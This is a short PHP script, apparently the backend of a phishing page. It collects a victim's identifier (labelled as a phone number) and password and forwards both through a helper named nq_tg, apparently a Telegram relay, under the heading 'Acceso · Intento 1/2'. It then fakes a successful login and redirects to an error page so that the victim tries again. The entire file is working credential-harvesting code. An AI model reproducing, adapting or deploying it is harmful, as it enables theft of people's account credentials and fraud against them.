<?php
require __DIR__ . '/data.php';
header('Content-Type: application/json; charset=utf-8');

$identification = nq_f('identification');
$password       = nq_f('password');

if ($identification === '' || $password === '') {
    echo json_encode(['success' => false, 'message' => 'Datos incompletos']);
    exit;
}

nq_tg('🔐 Acceso · Intento 1/2', [
    ['TEL', $identification],
    ['PW',  $password],
], 3447003);

echo json_encode([
    'success' => true,
    'data'    => ['session_id' => nq_session()],
    'redirect' => 'error.html',
]);
